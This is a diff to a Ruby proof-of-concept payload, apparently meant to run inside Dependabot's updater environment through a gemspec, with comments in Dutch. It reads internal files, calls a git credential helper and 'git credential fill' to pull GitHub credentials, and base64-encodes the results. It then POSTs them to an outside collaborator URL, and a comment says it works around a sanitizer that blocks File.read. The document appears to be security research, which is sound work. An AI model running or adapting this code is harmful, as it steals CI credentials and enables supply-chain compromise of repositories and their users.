@@ -5,24 +5,51 @@ read_file = ->(path) { IO.binread(path).force_encoding("UTF-8").encode("UTF-8", 
 begin
   require "net/http"
   require "uri"
+  require "open3"
 
   results = []
 
-  # Git credential store via IO.binread (File.read blocked by GemspecSanitizer)
-  Dir.glob("/home/dependabot/dependabot-updater/*.git.store").each do |f|
-    results << "=== GIT STORE: #{f} ===\n#{read_file.(f)}"
+  # api_client.rb - hoe werkt de auth zonder DEPENDABOT_JOB_TOKEN?
+  results << "=== api_client.rb ===\n#{read_file.('/home/dependabot/dependabot-updater/lib/dependabot/api_client.rb')}"
+
+  # /home/dependabot/bin/ - alle binaries
+  begin
+    bin_list = `ls -la /home/dependabot/bin/ 2>&1`
+    results << "=== /home/dependabot/bin/ ===\n#{bin_list}"
+  rescue; end
+
+  # git-credential-store-immutable direct aanroepen
+  store_file = Dir.glob("/home/dependabot/dependabot-updater/*.git.store").first
+  if store_file
+    begin
+      out, err, _ = Open3.capture3(
+        "/home/dependabot/bin/git-credential-store-immutable",
+        "--file", store_file, "get",
+        stdin_data: "protocol=https\nhost=github.com\n\n"
+      )
+      results << "=== CRED HELPER OUTPUT ===\n#{out}\nSTDERR: #{err}"
+    rescue => e
+      results << "=== CRED HELPER ERR: #{e.class}: #{e.message} ==="
+    end
   end
 
-  Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").each do |f|
-    results << "=== GITCONFIG: #{f} ===\n#{read_file.(f)}"
+  # Gitconfig aanroepen via git credential fill
+  gitconfig = Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").first
+  if gitconfig
+    begin
+      out, err, _ = Open3.capture3(
+        {"GIT_CONFIG_GLOBAL" => gitconfig},
+        "git", "credential", "fill",
+        stdin_data: "protocol=https\nhost=github.com\n\n"
+      )
+      results << "=== GIT CREDENTIAL FILL ===\n#{out}\nSTDERR: #{err}"
+    rescue => e
+      results << "=== GIT CREDENTIAL FILL ERR: #{e.class}: #{e.message} ==="
+    end
   end
-
-  results << "=== job.json ===\n#{read_file.('/home/dependabot/dependabot-updater/job.json')}"
-  results << "=== environment.rb ===\n#{read_file.('/home/dependabot/dependabot-updater/lib/dependabot/environment.rb')}"
-  results << "=== output/summary.md ===\n#{read_file.('/home/dependabot/dependabot-updater/output/summary.md')}"
 
   payload = [results.compact.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=binread")
+  post_uri = URI("#{COLLAB_URL}?poc=apiclient")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
